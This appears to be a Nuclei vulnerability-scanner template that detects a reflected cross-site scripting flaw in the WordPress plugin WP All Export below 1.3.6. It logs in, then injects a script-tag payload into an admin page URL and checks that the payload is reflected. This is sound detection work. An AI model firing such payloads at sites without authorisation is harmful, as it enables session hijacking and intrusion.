id: wp-all-export-xss
info:
  author: Akincibor
  description: The plugin does not escape some URLs before outputting them back in
    attributes, leading to Reflected Cross-Site Scripting.
  metadata:
    verified: true
  name: WP All Export < 1.3.6 - Reflected Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/de330a59-d64d-40be-86df-98997949e5e4
  severity: medium
  tags: wp-plugin,xss,wp,wordpress,authenticated
requests:
- cookie-reuse: true
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - manage&a\"><script>alert(1)</script>">
    - Manage Exports
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Origin: {{RootURL}}

    Content-Type: application/x-www-form-urlencoded

    Cookie: wordpress_test_cookie=WP%20Cookie%20check


    log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

    '
  - 'GET /wp-admin/admin.php?page=pmxe-admin-manage&a"><script>alert(1)</script> HTTP/1.1

    Host: {{Hostname}}

    '
